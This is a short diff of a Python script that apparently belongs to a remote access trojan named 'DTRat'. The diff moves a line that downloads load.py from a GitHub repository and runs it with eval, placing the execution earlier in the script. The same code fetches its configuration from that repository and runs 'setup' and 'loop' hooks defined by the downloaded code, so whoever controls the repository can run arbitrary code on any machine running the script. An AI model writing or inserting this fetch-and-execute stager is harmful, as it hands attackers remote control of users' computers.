@@ -10,6 +10,7 @@ while ip == "":
     except:
         print("Connection Error: wait 10sec")
         time.sleep(10)
+eval(requests.get("https://raw.githubusercontent.com/DTRat/dtrat-new/main/load.py?q={}".format(time.time)).content.decode("utf-8"))
 
 inidata = requests.get("https://raw.githubusercontent.com/DTRat/dtrat-new/main/config.ini?q={}".format(time.time())).content.decode("utf-8")
 
@@ -69,7 +70,6 @@ def define_caption():
 
 if "setup" in dir():
         setup()
-eval(requests.get("https://raw.githubusercontent.com/DTRat/dtrat-new/main/load.py?q={}".format(time.time)).content.decode("utf-8"))
 
 while True:
     if "loop" in dir():
